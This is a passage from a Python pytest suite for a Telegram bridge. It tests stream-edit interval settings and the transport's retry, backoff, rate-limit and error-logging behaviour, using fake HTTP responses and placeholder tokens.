        monkeypatch.setenv("BRIDGE_STREAM_EDIT_SECS", "7")
        assert db._stream_edit_secs() == 7.0

    def test_a_nonsense_interval_falls_back_to_the_default(self, monkeypatch):
        monkeypatch.setenv("BRIDGE_STREAM_EDIT_SECS", "soon")
        assert db._stream_edit_secs() == 3.0

    def test_the_interval_cannot_be_set_low_enough_to_earn_a_429(self, monkeypatch):
        # Telegram rate-limits edits per chat; a turn emitting a tool call every
        # 200ms would otherwise hammer it.
        monkeypatch.setenv("BRIDGE_STREAM_EDIT_SECS", "0")
        assert db._stream_edit_secs() == 1.0


# ══════════════════════════════════════════════════════════════════════════════
# 10. Telegram transport: retries and error visibility
# ══════════════════════════════════════════════════════════════════════════════


class FakeHTTPResponse:
    """Minimal stand-in for what urlopen returns, usable as a context manager."""

    def __init__(self, payload):
        self._body = json.dumps(payload).encode() if isinstance(payload, dict) else payload

    def read(self):
        return self._body

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False


def _http_error(code: int, description: str = "", retry_after: int = 0):
    import io
    import urllib.error
    body = json.dumps({"ok": False, "description": description}).encode()
    headers = {"Retry-After": str(retry_after)} if retry_after else {}
    return urllib.error.HTTPError(
        "https://api.telegram.org", code, description, headers, io.BytesIO(body))


@pytest.fixture
def transport():
    """Drive the real `_tg_call` against a scripted sequence of outcomes.

    Deliberately independent of the `bridge` fixture, which stubs `_tg_call`
    wholesale — right for every other test here, and useless when `_tg_call`
    is itself the thing under test. `wired_transport` builds the small amount
    of world this needs: a home with a token in it.
    """

    class Transport:
        def __init__(self):
            self.outcomes = []
            self.calls = 0
            self.sleeps = []

        def script(self, *outcomes):
            self.outcomes = list(outcomes)

        def urlopen(self, req, timeout=None):
            self.calls += 1
            outcome = self.outcomes.pop(0) if self.outcomes else {"ok": True}
            if isinstance(outcome, Exception):
                raise outcome
            return FakeHTTPResponse(outcome)

    return Transport()


@pytest.fixture
def wired_transport(tmp_path, monkeypatch, transport):
    """`transport`, with urlopen and sleep patched in and a token on disk."""
    home = tmp_path / "thome"
    (home / ".telechat").mkdir(parents=True)
    (home / ".telechat" / ".env").write_text(
        "TELEGRAM_BOT_TOKEN=test-token\nTELEGRAM_CHAT_ID=424242\n")
    monkeypatch.setattr(db, "TELECHAT_HOME", home / ".telechat")
    monkeypatch.setattr(db.urllib.request, "urlopen", transport.urlopen)
    monkeypatch.setattr(db.time, "sleep", lambda s: transport.sleeps.append(s))
    for name in ("BRIDGE_TG_RETRIES", "BRIDGE_TG_TIMEOUT"):
        monkeypatch.delenv(name, raising=False)
    return transport


class TestTelegramTransport:
    def test_a_successful_call_returns_the_payload(self, wired_transport):
        wired_transport.script({"ok": True, "result": {"message_id": 7}})
        assert db._tg_call("sendMessage", text="hi")["result"]["message_id"] == 7
        assert wired_transport.calls == 1

    def test_a_transient_failure_is_retried_rather_than_dropped(self, wired_transport):
        # The regression this exists for: one `urlopen` in a bare except meant a
        # laptop waking from sleep silently lost the card, with nothing logged.
        wired_transport.script(OSError("network is unreachable"),
                               {"ok": True, "result": {"message_id": 7}})
        assert db._tg_call("sendMessage", text="hi")["ok"] is True
        assert wired_transport.calls == 2

    def test_a_server_error_is_retried(self, wired_transport):
        wired_transport.script(_http_error(502, "Bad Gateway"), {"ok": True})
        assert db._tg_call("sendMessage", text="hi")["ok"] is True
        assert wired_transport.calls == 2

    def test_a_captive_portal_answering_with_html_is_retried(self, wired_transport):
        wired_transport.script(b"<html>sign in to the wifi</html>", {"ok": True})
        assert db._tg_call("sendMessage", text="hi")["ok"] is True

    def test_retries_are_bounded_and_then_it_gives_up(self, wired_transport):
        wired_transport.script(*[OSError("down")] * 10)
        assert db._tg_call("sendMessage", text="hi") is None
        assert wired_transport.calls == 4          # the documented default

    def test_giving_up_says_a_card_was_lost(self, wired_transport, caplog):
        wired_transport.script(*[OSError("down")] * 10)
        with caplog.at_level(logging.WARNING, logger=db.log.name):
            db._tg_call("sendMessage", text="hi")
        assert "gave up" in caplog.text

    def test_backoff_grows_between_attempts(self, wired_transport):
        wired_transport.script(*[OSError("down")] * 10)
        db._tg_call("sendMessage", text="hi")
        # Jittered, so assert the trend rather than exact values — and that
        # nothing sleeps for an absurd length of time in a hook subprocess.
        assert len(wired_transport.sleeps) == 3
        assert max(wired_transport.sleeps) <= 8.0
        assert wired_transport.sleeps[-1] > wired_transport.sleeps[0]

    def test_a_malformed_request_is_not_retried(self, wired_transport):
        # Retrying a 400 cannot help: the payload will be just as malformed.
        wired_transport.script(_http_error(400, "message text is empty"))
        assert db._tg_call("sendMessage", text="") is None
        assert wired_transport.calls == 1

    def test_a_bad_token_is_not_retried_and_is_visible(self, wired_transport, caplog):
        with caplog.at_level(logging.WARNING, logger=db.log.name):
            wired_transport.script(_http_error(401, "Unauthorized"))
            assert db._tg_call("sendMessage", text="hi") is None
        assert wired_transport.calls == 1
        assert "Unauthorized" in caplog.text

    def test_a_rate_limit_waits_exactly_as_long_as_telegram_asked(self, wired_transport):
        wired_transport.script(_http_error(429, "Too Many Requests", retry_after=7),
                               {"ok": True})
        assert db._tg_call("sendMessage", text="hi")["ok"] is True
        assert wired_transport.sleeps == [7.0]

    def test_an_ok_false_retry_after_is_also_honoured(self, wired_transport):
        # Telegram sometimes reports a flood wait as HTTP 200 with ok=false.
        wired_transport.script(
            {"ok": False, "description": "Too Many Requests",
             "parameters": {"retry_after": 3}},
            {"ok": True})
        assert db._tg_call("sendMessage", text="hi")["ok"] is True
        assert wired_transport.sleeps == [3.0]

    def test_an_outlandish_retry_after_is_capped(self, wired_transport):
        # A hook subprocess honouring a 20-minute wait verbatim looks like a hang.
        wired_transport.script(_http_error(429, "flood", retry_after=1200), {"ok": True})
        db._tg_call("sendMessage", text="hi")
        assert wired_transport.sleeps == [db._TG_MAX_RETRY_AFTER]

    def test_a_refusal_is_handed_back_so_callers_can_fall_back(self, wired_transport):
        # _tg_send and _tg_edit answer a Markdown parse failure by retrying as
        # plain text — they need the non-ok payload, not None.
        payload = {"ok": False, "description": "can't parse entities"}
        wired_transport.script(payload)
        assert db._tg_call("editMessageText", text="*bad")["ok"] is False
        assert wired_transport.calls == 1

    def test_no_token_means_no_request_at_all(self, wired_transport, monkeypatch, tmp_path):
        empty = tmp_path / "empty"
        empty.mkdir()
        monkeypatch.setattr(db, "TELECHAT_HOME", empty)
        monkeypatch.delenv("TELEGRAM_BOT_TOKEN", raising=False)
        assert db._tg_call("sendMessage", text="hi") is None
        assert wired_transport.calls == 0

    def test_retries_can_be_switched_off(self, wired_transport, monkeypatch):
        # The escape hatch for anyone who would rather lose a card than risk the
        # duplicate a retried-but-actually-delivered send can produce.
        monkeypatch.setenv("BRIDGE_TG_RETRIES", "1")
        wired_transport.script(*[OSError("down")] * 5)
        assert db._tg_call("sendMessage", text="hi") is None
        assert wired_transport.calls == 1

    def test_a_nonsense_retry_setting_falls_back_to_the_default(self, monkeypatch):
        monkeypatch.setenv("BRIDGE_TG_RETRIES", "many")
        assert db._tg_attempts() == 4

    def test_a_nonsense_timeout_falls_back_to_the_default(self, monkeypatch):
        monkeypatch.setenv("BRIDGE_TG_TIMEOUT", "soon")
        assert db._tg_timeout() == 10.0

    def test_the_attempt_count_cannot_be_zero(self, monkeypatch):
        monkeypatch.setenv("BRIDGE_TG_RETRIES", "0")
        assert db._tg_attempts() == 1
